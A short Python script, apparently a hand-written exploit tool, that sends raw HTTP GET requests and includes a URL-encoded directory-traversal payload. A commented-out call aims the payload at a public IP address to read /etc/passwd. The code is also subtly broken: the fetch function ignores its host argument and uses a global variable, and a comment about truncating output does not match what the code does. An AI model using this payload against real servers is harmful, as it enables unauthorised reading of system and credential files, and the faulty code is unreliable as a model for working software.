import socket

# ANSI escape color codes
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
BLUE   = "\033[34m"
MAGENTA = "\033[35m"
CYAN   = "\033[36m"
RESET  = "\033[0m"

def get_chunks(sox):
    fux = b''
    while True:
        chunk = sox.recv(4096)
        if not chunk:
            break
        fux += chunk
    sox.close()
    return fux

def fetch_it(host, GET="/", output_file=None, port=80):
    s = socket.socket()
    s.connect((url, port))
    s.send(f"GET {GET} HTTP/1.1\r\n\r\n".encode())
    
    response = get_chunks(s)
    
    # Text mode
    text = response.decode('utf-8', errors='ignore')
    if output_file:
        with open(output_file, 'w') as f:
            f.write(text)
        print(f"{GREEN}[+] Saved to {output_file}{RESET}")
    
    return text

fuxit="%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"

url = "10.0.0.1"
resp = fetch_it(url, output_file="fake.txt")
print(resp)  # print first 1000 chars

#
#fetch_it("184.19.121.228", fuxit+"/etc/passwd")
